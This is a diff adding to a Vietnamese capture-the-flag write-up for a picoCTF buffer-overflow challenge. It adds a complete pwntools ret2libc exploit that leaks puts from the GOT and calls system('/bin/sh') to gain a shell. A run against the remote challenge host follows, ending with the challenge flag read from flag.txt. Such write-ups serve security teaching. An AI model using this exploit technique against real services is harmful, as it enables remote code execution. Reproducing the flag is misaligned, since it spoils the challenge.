@@ -112,3 +112,59 @@ Stack level 0, frame at 0x7fffffffde60:
 ```
 Padding = 0x7fffffffde58 - 0x00007fffffffddd0 = 136  
 Code khai thác:
+```
+#!/usr/bin/env python3
+from pwn import *
+exe = ELF("./vuln_patched", checksec = False)
+libc = ELF("./libc.so.6", checksec = False)
+ld = ELF("./ld-2.27.so", checksec = False)
+poprdi_ret = 0x0000000000400913
+ret = 0x000000000040052e
+context.binary = exe
+def conn():
+    if args.LOCAL:
+        r = process([exe.path])
+        if args.DEBUG:
+            gdb.attach(r, api=True)
+    else:
+        r = remote("mercury.picoctf.net", 42072)
+    return r
+def main():
+    r = conn()
+    #part 1: libc puts function leak
+    payload = b"a"*136 + p64(poprdi_ret) + p64(exe.got['puts'])
+    payload += p64(exe.plt['puts']) + p64(exe.sym['main'])
+    r.sendlineafter(b" EcHo sErVeR!\n", payload)
+    r.recvuntil(b"aaaad\n")
+    libc_puts = u64(r.recv(6) + b'\0\0')
+    print("Libc puts:" + hex(libc_puts))
+    #part 2: get shell
+    input()
+    libc.address = libc_puts - libc.sym['puts']
+    payload = b"a"*136 + p64(poprdi_ret) + p64(next(libc.search(b"/bin/sh")))
+    payload += p64(ret) #làm cho stack không bị lẻ
+    payload += p64(libc.sym['system'])
+    r.sendline(payload)
+    r.interactive()
+if __name__ == "__main__":
+    main()
+```
+Chạy code và lấy được flag:
+```
+$ ./solve.py
+[+] Opening connection to mercury.picoctf.net on port 42072: Done
+Libc puts:0x7f58dec2ca30
+
+[*] Switching to interactive mode
+
+WeLcOmE To mY EcHo sErVeR!
+AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaaaaaaaaaaaaaaaaaaaaad
+$ ls
+flag.txt
+libc.so.6
+vuln
+vuln.c
+xinet_startup.sh
+$ cat flag.txt
+picoCTF{1_<3_sm4sh_st4cking_3a9ee516616d21b3}
+```
